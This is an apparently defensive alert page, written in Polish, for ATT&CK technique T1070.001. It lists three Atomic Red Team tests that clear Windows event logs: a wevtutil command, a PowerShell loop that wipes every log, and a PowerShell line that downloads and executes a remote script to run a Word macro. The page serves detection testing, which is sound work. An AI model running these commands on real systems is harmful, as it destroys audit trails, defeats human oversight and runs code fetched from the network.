# Alert: Clear Windows Event Logs

Opis scenariusza, podatności lub techniki.

---

**Technika:** T1070.001  
**Nazwa:** Clear Windows Event Logs  
**Taktyki:** Defense-Evasion  
**Status:** Pending  
**Autor:** Krzysztof K.  

---

<!--
Tactics: Defense-Evasion
Technique ID: T1070.001
Technique Name: Clear Windows Event Logs
Status: Pending
--> 


---

## Atomic Red Team – dostępne testy dla tej techniki

### Clear Logs
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
wevtutil cl #{log_name}
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1070.001\Clear_Logs/test_1.cmd)

### Delete System Logs Using Clear-EventLog
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
$logs = Get-EventLog -List | ForEach-Object {$_.Log}
$logs | ForEach-Object {Clear-EventLog -LogName $_ }
Get-EventLog -list
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1070.001\Delete_System_Logs_Using_Clear-EventLog/test_1.ps1)

### Clear Event Logs via VBA
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1070.001\Clear_Event_Logs_via_VBA/test_1.ps1)

[Zobacz testy na GitHubie](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1070.001)
